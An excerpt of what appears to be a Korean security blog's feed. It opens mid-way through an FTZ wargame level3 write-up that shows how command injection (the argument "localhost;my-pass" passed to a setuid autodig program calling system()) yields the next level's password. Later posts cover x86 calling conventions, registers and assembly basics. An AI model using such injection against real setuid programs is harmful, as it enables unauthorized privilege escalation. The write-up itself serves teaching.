    &lt;span class=&quot;token function&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; cmd &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

이를 이용하여 level4의 권한을 얻어라&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;

more hints&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; 동시에 여러 명령어를 사용하려면&lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; 문자열 형태로 명령어를 전달하려면&lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;autodig를 사용하라고 한다. &lt;code class=&quot;language-text&quot;&gt;strcpy&lt;/code&gt;와 &lt;code class=&quot;language-text&quot;&gt;strcat&lt;/code&gt;을 이용하여 cmd라는 배열에 최종적으로&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&quot;dig @&apos;인자로 받은 문자열&apos; version.bind chaos txt&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;라는 문자열을 만들게 된다. 이 문제에서 dig는 별로 중요하지 않지만 dig는 인자로 받은 주소(네트워크 주소)에 대한 정보를 알려주는 명령어이다.&lt;/p&gt;
&lt;p&gt;여기서 중요한 것은 힌트를 보게 되면 동시에 여러 명령어를 사용하려면 인데, 리눅스에서 동시에 여러 명령어를 사용하려면 &lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;를 기준으로 사용하면 된다. 우리가 코딩을 할 때 ;을 기준으로 문장을 끝내듯이, 리눅스 명령을 사용할 때에도 ;을 기준점으로 사용하면 된다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;pwd; cd /; pwd;&lt;/code&gt;을 예시로 사용해 보겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level3@ftz level3&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token builtin class-name&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; /&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;pwd&lt;/span&gt;
/home/level3
/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;첫 pwd에 의해서 현재 디렉토리의 위치를 출력해 주고, 가운데 &lt;code class=&quot;language-text&quot;&gt;cd /&lt;/code&gt;에 의해 /디렉토리로 이동됬다. 그 후 마지막 &lt;code class=&quot;language-text&quot;&gt;pwd&lt;/code&gt;에 의해 /의 위치임을 출력하게 되었다. 이렇게 한번의 명령을 보낼 때 &lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;을 기준으로 여러 명령을 보낼수 있다.&lt;/p&gt;
&lt;p&gt;이점을 이용하여 이번 문제를 해결해 보겠다.&lt;/p&gt;
&lt;p&gt;우선 파일의 위치를 검색한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level3@ftz level3&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;find&lt;/span&gt; / -user level4 -perm +6000 &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null
/bin/autodig&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;파일을 실행 할 때 my-pass명령어를 실행 시키도록 하겠다. &lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;을 사용하면 되므로, 인자를 &lt;code class=&quot;language-text&quot;&gt;localhost;my-pass&lt;/code&gt;로 주겠다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level3@ftz level3]$ /bin/autodig localhost;my-pass
; &amp;lt;&amp;lt;&gt;&gt; DiG 9.2.1 &amp;lt;&amp;lt;&gt;&gt; @localhost version.bind chaos txt
;; global options:  printcmd
;; connection timed out; no servers could be reached

Level3 Password is &quot;can you fly?&quot;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Level4의 password가 아닌 Level3의 password를 보여주고 있다. 명령이 제대로 들어가지 않은 것이다. 이 부분에서 hint의 2번째를 생각해야 한다.&lt;/p&gt;
&lt;p&gt;문자열의 형태로 보낸다는 것은 우리가 적은 인자는 문자열의 형태가 아닌 ;를 기준으로 끊어 보내게 된다. 그러므로 /bin/autodig localhost라는 문장과 my-pass라는 문장을 끊어서 해석하게 된다.&lt;/p&gt;
&lt;p&gt;그렇게 되면 /bin/autodig localhost가 끝나게 되면 my-pass를 실행시키게 되는데, setuid가 걸려있는 프로그램에서 실행시키는 것이 아닌 &lt;strong&gt;현재 터미널&lt;/strong&gt;에서 실행시키게 되어 권한은 level3의 권한을 유지하고 있다.&lt;/p&gt;
&lt;p&gt;문장을 한번에 보내기 위해서는 &lt;code class=&quot;language-text&quot;&gt;&quot;&quot;&lt;/code&gt;를 사용하여 보내고자 하는 부분을 묶어 보내야 한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[level3@ftz level3]$ /bin/autodig &quot;localhost;my-pass&quot;
; &amp;lt;&amp;lt;&gt;&gt; DiG 9.2.1 &amp;lt;&amp;lt;&gt;&gt; @localhost
;; global options:  printcmd
;; connection timed out; no servers could be reached

Level4 Password is &quot;           &quot;.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 &quot;&quot;를 사용하게 되면 원하는 문자열로 보낼 수 있다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[함수 호출 규약]]></title><description><![CDATA[기본적으로 함수 호출시 매개변수를 부를 때 뒤에 있는 인자 부터 부른다. (컴파일러 마다 다름. 컴파일러 최적화에 의해 다른 순서로 불릴수 있다.) stdcall (Standard Call) Windows API Default Call…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 29 Jun 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;기본적으로 함수 호출시 매개변수를 부를 때 뒤에 있는 인자 부터 부른다.&lt;/p&gt;
&lt;p&gt;(컴파일러 마다 다름. 컴파일러 최적화에 의해 다른 순서로 불릴수 있다.)&lt;/p&gt;
&lt;h2 id=&quot;stdcall-standard-call&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#stdcall-standard-call&quot; aria-label=&quot;stdcall standard call permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;stdcall (Standard Call)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Windows API Default Call&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;스택 정리를 콜리(Callee)가 한다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;함수 호출시 사용한 매개변수를 부른 곳(부른 함수의 메모리)이 아닌 불려진 곳(매개변수를 사용하는 함수)에서 정리하고 함수가 끝난다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;가변 형태 지원 불가&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;매개변수의 갯수가 정해진 함수이기 때문에 printf와 같이 인자의 수가 변하는 함수에서는 사용 할 수 없다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;cdecl&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cdecl&quot; aria-label=&quot;cdecl permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;cdecl&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;C/C++ Default Call&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;스택 정리를 콜러(Caller)가 한다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;함수 호출시 사용한 매개 변수를 부른 곳(함수를 사용하는 메모리)에서 정리한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;가변 형태 지원.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;인자 수가 변할 수 있는 형식의 함수를 지원한다.&lt;/li&gt;
&lt;li&gt;ex) printf, scanf …&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;fastcall&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#fastcall&quot; aria-label=&quot;fastcall permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;fastcall&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;매개변수 2개까지는 스택이 아닌 레지스터(ecx, edx)에서 처리한다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ex) int __fastcall test(int a, int b, int c)의 함수를 호출 할 경우 a와 b의 값은 레지스터에서 처리하고, c의 값은 스택으로 처리한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;스택정리를 콜러(Caller)가 한다.&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[레지스터 (x86)]]></title><description><![CDATA[연산 레지스터 EAX 주로 산술, 논리 연산에 쓰이며 함수의 리턴 값을 저장한다. EBX 주로 ESI, EDI와 결합하여 인덱스에 사용된다. ECX 반복문에서 반복 횟수 지정에 사용된다. (C = Count) EDX 산술, 논리 연산에 쓰이며, EAX…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 28 Jun 2015 00:00:00 GMT</pubDate><content:encoded>&lt;h5 id=&quot;연산-레지스터&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%97%B0%EC%82%B0-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0&quot; aria-label=&quot;연산 레지스터 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;연산 레지스터&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EAX&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;주로 산술, 논리 연산에 쓰이며 함수의 리턴 값을 저장한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EBX&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;주로 ESI, EDI와 결합하여 인덱스에 사용된다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ECX&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;반복문에서 반복 횟수 지정에 사용된다. (C = Count)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EDX&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;산술, 논리 연산에 쓰이며, EAX의 보조적 역할을 한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;포인터-레지스터&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%ED%8F%AC%EC%9D%B8%ED%84%B0-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0&quot; aria-label=&quot;포인터 레지스터 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;포인터 레지스터&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ESP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;스택 영역의 최상단을 가르킨다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EBP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;스택 영역의 바닥이 되는 주소를 가르킨다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;인덱스-레지스터&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%9D%B8%EB%8D%B1%EC%8A%A4-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0&quot; aria-label=&quot;인덱스 레지스터 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;인덱스 레지스터&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ESI&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;복사/비교시 대상(Source)의 주소를 가르킨다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EDI&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;복사/비교시 결과(Destination)의 주소를 가르킨다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;플래그-레지스터&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%ED%94%8C%EB%9E%98%EA%B7%B8-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0&quot; aria-label=&quot;플래그 레지스터 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;플래그 레지스터&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EFLAGS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;연산의 결과 및 시스템 제어를 위한 정보가 저장되어 있다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CF&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;연산 결과의 자리수 변화가 발생하였는지 판별한다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ZF&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;값의 결과가 0인지 판별한다. CMP의 경우 같으면 ZF가 켜지게 된다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;명령어-레지스터&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%AA%85%EB%A0%B9%EC%96%B4-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0&quot; aria-label=&quot;명령어 레지스터 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;명령어 레지스터&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;EIP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;다음 실행할 명령이 들어 있는 주소를 가르킨다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[어셈블리 intel x86]]></title><description><![CDATA[오퍼랜드 어셈블리에서 피연산자와 같은 역할을 함. 데이터 타입 BYTE 부호없는 1Byte WORD 부호없는 2Byte DWORD 부호없는 4Byte 증가/감소 연산자 INC 오퍼랜드를 1 증가시킨다.   INC reg
  INC mem   ex…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 28 Jun 2015 00:00:00 GMT</pubDate><content:encoded>&lt;h4 id=&quot;오퍼랜드&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%98%A4%ED%8D%BC%EB%9E%9C%EB%93%9C&quot; aria-label=&quot;오퍼랜드 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;오퍼랜드&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;어셈블리에서 피연산자와 같은 역할을 함.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;데이터-타입&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%83%80%EC%9E%85&quot; aria-label=&quot;데이터 타입 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;데이터 타입&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;BYTE&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;부호없는 1Byte&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;WORD&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;부호없는 2Byte&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;부호없는 4Byte&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&quot;증가감소-연산자&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EC%A6%9D%EA%B0%80%EA%B0%90%EC%86%8C-%EC%97%B0%EC%82%B0%EC%9E%90&quot; aria-label=&quot;증가감소 연산자 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;증가/감소 연산자&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;INC&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드를 1 증가시킨다.&lt;/p&gt;
&lt;p&gt;  INC reg
INC mem&lt;/p&gt;
&lt;p&gt;  ex) INC eax  —&gt; eax의 값을 1증가시킨다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DEC&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드를 1 감소시킨다.&lt;/p&gt;
&lt;p&gt;  DEC reg
DEC mem&lt;/p&gt;
&lt;p&gt;  ex) DEC [ebp - 4] —&gt; (ebp - 4)가 가르키는 메모리에 대한 값을 1감소시킨다.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ADD&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;오퍼랜드1에 오퍼랜드2의 값을 더한다.&lt;/p&gt;
&lt;p&gt;  ADD reg, reg
ADD mem, reg
ADD reg, mem
ADD reg, imm
ADD mem, imm&lt;/p&gt;
&lt;p&gt;  ex) ADD eax, 0xf —&gt; eax에 0xf(15)를 더한다&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
